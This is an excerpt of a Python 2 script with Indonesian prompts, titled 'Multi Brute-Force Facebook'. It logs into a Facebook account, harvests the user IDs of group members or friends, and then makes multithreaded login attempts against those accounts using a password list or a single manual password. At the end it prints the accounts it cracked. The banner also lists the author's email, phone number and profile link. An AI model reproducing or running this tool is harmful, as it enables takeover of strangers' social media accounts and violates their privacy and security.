...
if platform.python_version().split('.')[0] != '2':
	tampil('\rm# Python versi %s tidak support, silahkan install versi 2.x.x'%v().split(' ')[0])
	os.sys.exit()
import cookielib,re,urllib2,urllib,threading
try:
	import mechanize
except ImportError:
	tampil('\rm# Module \rcmechanize\rm belum terinstall, install terlebih dahulu')
	os.sys.exit()
def keluar():
	simpan()
	tampil('\rm# Keluar')
	...
	while 1:
		...
		if v:
			if a.upper() in v:
				...
				tampil('\rm* Pilih opsi!')
				continue
		else:
			if len(a) == 0:
				tampil('\rm# Input tidak tersedia, coba lagi')
				continue
			else:
				break
	return a
def inputM(x,d):
	while 1:
		...
		if i in d:
			...
			tampil('\rm# Pilihan tidak tersidia')
	return i
def simpan():
	if len(id_bgroup) != 0:
		tampil('\rh*** Menyimpan ID anggota group...')
		try:
			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
			tampil('\rh* Tersimpan \rcMBFbgroup.txt')
		except:
			tampil('\rm###Gagal, tidak dapat menyimpan')
	if len(id_bteman) != 0:
		tampil('\rh*** Menyimpan ID teman....')
		try:
			open(os.sys.path[0]+'/MBFbteman.txt','w').write('\n'.join(id_bteman))
			tampil('\rm* Tersimpan \rcMBFbgteman.txt')
		except:
			tampil('\rm###Gagal, tidak dapat menyimpan')
def buka(d):
	...
	try:
		...
		tampil('\rm###Gagal, tidak dapat membuka \rp'+d)
		keluar()
...
def login():
	...
	print ('*** PANEL LOGIN')
	print ('===============================')
	us = inputD('-> E-Mail/Phone ')
	pa = inputD('-> Password     ')
	tampil('\rh*** Mencoba Login....')
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		tampil('\rh===>>> Selamat Menikmati tools kami \rk%s\n\rh Berdoa sebelum mencoba, pasti ada kemudahan ....'%nama)
		log = 1
	elif 'checkpoint' in url:
		tampil('\rm### Akun kena ceckpoin, PULIHKAN dahulu di browser Anda, ')
		keluar()
	else:
		tampil('\rm### GAGAL LOGIN!!!')
...
def saring_id_group0():
	...
	while 1:
		...
		try:
			...
			tampil('\rm### ID salah, tidak tersedia!!')
			continue
	tampil('\rh[*]Mengambil ID anggota group \rc%s'%nama)
	saring_id_group1(a)
	return next
def idgroup():
	if log != 1:
	...
	while 1:
		...
		try:
			...
			tampil('\rm** ID terambil \rh %d id'%len(id_bgroup))
			break
	simpan()
...
def idteman():
	...
	try:
		...
		if len(id_teman) != 0:
			tampil('\rm** ID termbil \rp%d id'%len(id_bteman))
		else:
			tampil('\rm# Batal')
			keluar()
	while 1:
		...
		try:
			...
			tampil('\rm** ID terambil \rp%d id'%len(id_bteman))
			break
	simpan()
	i = inputD('*** Langsung CRACK??? (y/t)',['Y','T'])
	if i.upper() == 'Y':
...
class mt(threading.Thread):
    ...
    def run(self):
        ...
        if 'm_sess' in data.url or 'save-device' in data.url:
            ...
            self.a = 0
def crack(d):
	i = inputD('*** Pilih metode cracking! Passwordlist atau Manual? (p/m)',['P','M'])
	if i.upper() == 'P':
		while 1:
			...
			try:
				...
				tampil('\rm### Gagal, tidak terbuka \rk%s'%dir)
				continue
			break
		tampil('\rh*** CRACKING dimulai...  \rk%d password'%len(D))
		for i in D:
			i = i.replace('\n','')
			if len(i) != 0:
				crack0(d,i,0)
		i = inputD('** Ingin CRACK lagi??(y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(d)
		else:
			return menu()
	else:
		return crack0(d,inputD('Manual Sandi: '),1)
def crack0(data,sandi,p):
	tampil('\rh*** men-CRACK \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
	...
	while 1:
		try:
			for i in th:
				...
				if a[0] != 3 and a[1] not in akun_jml:
					...
					print('\r\033[32;1m*** CRACKING dimulai \033[31;1m[\033[36;1m%0.2f%s\033[31;1m]\033[0m'%(float((float(jml0)/float(jml1))*100),'%'),end='')
					os.sys.stdout.flush()
					akun_jml.append(a[1])
		except KeyboardInterrupt:
			os.sys.exit()
		try:
			...
			keluar()
	print('\r\033[32;1m*** *** CRACKING dimulai \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
	if len(akun_sukses) != 0:
		tampil('\rh[*]Daftar akun sukses')
		for i in akun_sukses:
			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
	tampil('\rh[*]Akun berhasil\rp      %d'%len(akun_sukses))
	...
	tampil('\rc[*]Akun error\rp         %d'%len(akun_error))
       	if p:
		i = inputD('** CRACKING lagi? (y/t)',['Y','T'])
		if i.upper() == 'Y':
			return crack(data)
		else:
			return menu()
...
def lanjutT():
	global fid_bteman
	if len(fid_bteman) != 0:
		i = inputD('** Reset ID teman atau lanjutkan? (r/l)',['R','L'])
		if i.upper() == 'L':
...
def lanjutG():
	global fid_bgroup
	if len(fid_bgroup) != 0:
		i = inputD('** Riset ID Group atau lanjutkan (r/l)',['R','L'])
		if i.upper() == 'L':
...
\rm    M U L T I   B R U T E - F O R C E   F A C E B O O K
...
\rh #####  #   #  #  ## #  ##      ###### # # #    ## #  ##
\rh----------------------------------------------------------
\rh|        \rkAuthor  : RUZTAM D'ROCKZ                        \rh|
\rh|        \rkFacebook: https://m.facebook.com/dark.link.666  \rh|
\rh|        \rk                (Ruztam D'Rock)                 \rh|
\rh|        \rkEmail   : rustamlarustamsapal@gmail.com         \rh|
\rh|        \rkPhone   : +62 823 9820 7776                     \rh|
\rh|        \rkGithub  : Noob-project                          \rh|
\rh----------------------------------------------------------
\rm JIKA SOBAT MENGALAMI KENDALA DALAM MENGGUNAKAN TOOLS INI,
\rm                  SILAHKAN HUBUNGI SAYA.
\rh          =======================================
\rm                Mohon Gunakan dengan bijak!
\rh          ========>>>SELAMAT MENIKMATI<<<========
\rh      Dan jangan lupa berdoa sebelum menjalankan tools :v ''')
	tampil('''\rk%s\n\rc1 \rhAmbil ID anggota group\n\rc2 \rhAmbil ID daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('>'*20,'<'*20))
	tampil("\rh ___[x]===[Root-&&-Mod]-by-[Ruztam-D'Rock]")
	tampil('\rh|')
	tampil('\rh|---[=]---[Pilih_opsi]')
	tampil('\rh|')
	i = inputM('|___[+]===>>___',[1,2,3])
	if i == 1:
		lanjutG()
		idgroup()
	elif i == 2:
